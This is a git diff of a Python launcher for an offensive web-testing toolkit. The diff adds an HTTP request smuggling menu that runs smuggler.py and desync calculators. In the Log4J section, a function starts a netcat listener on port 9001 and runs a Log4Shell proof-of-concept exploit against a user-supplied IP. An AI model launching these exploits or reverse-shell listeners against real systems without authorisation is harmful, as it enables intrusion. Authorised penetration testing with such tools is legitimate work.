@@ -9,6 +9,7 @@ import platform
 import getpass
 
 username=getpass.getuser()
+
 '''
 WAF DETECTION
 '''
@@ -50,7 +51,7 @@ def log4J_shell():
     print(f"{ok} Log4J Scanner\n")
     ip=input("Insert your IP (tap if use the VPN): ")
     print(f"{ok} Launch in a new terminal this command: wsl nc -lvnp 9001")
-    os.system("cmd /c start powershell -Command { wsl nc -lvnp 9001 }")
+    #os.system("cmd /c start powershell -Command { wsl nc -lvnp 9001 }")
     os.system(f"python3 {root_path}\\log4j-shell-poc\\poc.py --userip {ip} --webport 80 --lport 9001")
     
 
@@ -67,7 +68,7 @@ def verb_tampering():
     os.system(f"python3 {root_path}\\httpmethods\\httpmethods.py -h ")
     print("\n") 
     url=input(f"{warning} Insert url: ")
-    params=input(f"{warning} Insert others params: ")
+    params=input(f"{warning} Insert others params (press enter if you don't add any params): ")
     if params == "":
         os.system(f"python3 {root_path}\\httpmethods\\httpmethods.py {url} ")
     else:
@@ -80,6 +81,44 @@ def verb_tampering():
     else:
         os.system("clear")
     time.sleep(1)
+
+
+'''
+HTTP Request smuggling
+'''
+def smuggling():
+    if platform.system() == "Windows":
+        os.system("cls")
+    else:
+        os.system("clear")
+    print(f"{ok} HTTP REQUEST SMUGGLING\n")
+    x=input(f"{warning} Before pressing any button, look this link of Port Swigger and verify the HTTP Request smuggling vulnerability: https://portswigger.net/web-security/request-smuggling")
+    os.system(f"python3 {root_path}\\smuggling\\smuggler\\smuggler.py -h ")
+    print("\n")
+    url=input(f"{warning} Insert url: ")
+    params=input(f"{warning} Insert others params (press enter if you don't add any params): ")
+    if params == "":
+        os.system(f"python3 {root_path}\\smuggling\\smuggler\\smuggler.py -u {url} ")
+    else:
+        os.system(f"python3 {root_path}\\smuggling\\smuggler\\smuggler.py -u {url} {params}")
+    
+    print(f"{ok} C:\\Users\\{username}\\Desktop\\PERSEUS\\tools\\smuggling\\smuggler\\payloads you can find the possible payload")
+
+    choose=input(f"{warning} Find potential (1) CLTE or (2) TECL?: ")
+    choose=int(choose)
+    if choose == 1:
+        os.system(f"python3 {root_path}\\smuggling\\HTTP-Smuggling-Calculator\\CLTE_DesyncCalculator_.py")
+    else:
+        os.system(f"python3 {root_path}\\smuggling\\HTTP-Smuggling-Calculator\\TECL_DesyncCalculator.py")
+    
+    x=input(f"{ok} HTTP Request smuggling completed. Press enter")
+
+    if platform.system() == "Windows":
+        os.system("cls")
+    else:
+        os.system("clear")
+    time.sleep(1)
+
 
 '''
 CHECK HEADER
